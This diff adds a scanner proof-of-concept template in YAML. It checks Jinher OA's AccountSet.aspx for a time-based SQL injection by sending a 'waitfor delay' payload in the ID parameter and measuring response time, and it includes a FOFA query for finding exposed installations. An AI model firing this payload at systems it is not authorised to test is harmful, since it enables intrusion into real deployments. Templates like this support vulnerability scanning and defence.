@@ -1,0 +1,28 @@
+id: poc-yaml-jinher-jhsoft-accountset-aspx-sqli
+info:
+  name: 金和OA AccountSet.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /c6/JHSoft.Web.CostControl/subClass/AccountSet.aspx/?ID=1;waitfor+delay%270:0:{{.t1}}%27--&OperType=Edit
+  expression: 'status_code == 200 &&
+
+    contains(gbk_decode(body),"帐套设置") &&
+
+    contains(gbk_decode(body),"系统编码") &&
+
+    contains(gbk_decode(body),"帐套状态") &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
